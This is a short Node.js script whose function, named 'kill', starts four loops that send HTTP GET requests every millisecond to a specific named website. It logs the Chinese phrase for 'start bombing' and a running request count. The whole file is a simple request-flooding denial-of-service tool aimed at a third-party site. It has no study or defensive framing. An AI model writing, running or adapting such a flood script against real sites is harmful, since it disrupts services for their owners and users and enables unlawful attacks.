let http = require('http')
let count = 0;
async function kill(){
  await setInterval(()=>{
    http.get('http://websitdevelopment.cn/',function () {
      console.log('开始轰炸')
      count++
      console.log(count)
    })
  },1);
  await setInterval(()=>{
    http.get('http://websitdevelopment.cn/',function () {
      console.log('开始轰炸')
      count++
      console.log(count)
    })
  },1)
  await setInterval(()=>{
    http.get('http://websitdevelopment.cn/',function () {
      console.log('开始轰炸')
      count++
      console.log(count)
    })
  },1);
  await setInterval(()=>{
    http.get('http://websitdevelopment.cn/',function () {
      console.log('开始轰炸')
      count++
      console.log(count)
    })
  },1)
}
kill()


